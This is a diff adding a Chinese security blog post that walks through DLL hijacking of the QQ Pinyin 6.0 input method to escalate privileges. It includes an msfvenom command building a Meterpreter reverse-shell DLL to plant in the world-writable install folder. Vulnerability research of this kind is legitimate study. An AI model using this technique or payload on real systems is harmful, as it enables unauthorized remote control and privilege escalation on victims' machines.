@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <p>QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</p>
+<ul>
+<li>目录
+{:toc}</li>
+</ul>
+<h2 id="0x00-dll劫持简介">0x00 DLL劫持简介</h2>
+<p>《DLL劫持》技术当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间中。 &ndash; 百度百科</p>
+<h2 id="0x01-应用程序寻找dll的过程">0x01 应用程序寻找DLL的过程</h2>
+<ul>
+<li>1.程序所在目录</li>
+<li>2.系统目录即 SYSTEM32 目录</li>
+<li>3.16位系统目录即 SYSTEM 目录</li>
+<li>4.Windows目录</li>
+<li>5.加载 DLL 时所在的当前目录</li>
+<li>6.PATH环境变量中列出的目录</li>
+</ul>
+<p>首先如果在程序所在目录下未寻找到DLL，一般会在SYSTEM32目录下寻找到，那么可能会存在DLL劫持，要看注册表</p>
+<p><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p>
+<p>Windows操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p>
+<h2 id="0x02-寻找过程">0x02 寻找过程</h2>
+<p>Process Monitor一款系统进程监视软件，总体来说，Process Monitor相当于Filemon+Regmon，其中的Filemon专门用来监视系统 中的任何文件操作过程，而Regmon用来监视注册表的读写操作过程。 有了Process Monitor，使用者就可以对系统中的任何文件和 注册表操作同时进行监视和记录，通过注册表和文件读写的变化， 对于帮助诊断系统故障或是发现恶意软件、病毒或木马来说，非常 有用。 这是一个高级的 Windows 系统和应用程序监视工具，由优秀的 Sysinternals 开发，并且目前已并入微软旗下，可靠性自不用说。</p>
+<p>通过Process Monitor找出一些可能容易被劫持的DLL，特征一般如下：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-06-09/0x01.jpg" alt="0x01"></p>
+<ul>
+<li>ntmarta.dll(直接调用)</li>
+<li>profapi.dll（需要点击“配置”）</li>
+</ul>
+<p>这两个都不在KnownDLLs中，由于开发人员调用这两个DLL的时候没有定义绝对路径，导致DLL搜索，我们可以直接在搜索到system32之前，放入我们要劫持的DLL。</p>
+<p>权限问题：</p>
+<p>如果要劫持的DLL目录被操作系统限制了必须以管理员权限才可以读写，那么我们无法利用，本文演示从低权限到高权限的DLL劫持提权。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-06-09/0x02.jpg" alt="0x02"></p>
+<p>那么这个漏洞刚刚好也符合我们的案例：C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400</p>
+<p>这个目录是任何人都可以读写的，使用MSF生成DLL：</p>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.19 LPORT=4478 -f dll &gt; ntmarta.dll</code></p>
+<p>接下来通过任意途径，将dll copy到<code>C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400</code>路径下即可</p>
+<p>MSF配置如下：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-06-09/0x03.jpg" alt="0x03"></p>
+<p>当用户使用输入法的时候、或者重启PC的时候，或者切换输入法的时候，都将会触发，我们可以获得一个Meterpreter会话。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-06-09/0x04.jpg" alt="0x04"></p>
+<h2 id="0x03-视频演示">0x03 视频演示</h2>
+<video src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-06-09/QQPINYIN.mp4" controls="controls" width="500px">
+哎呀~ 换个浏览器试试吧！
+</video>
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
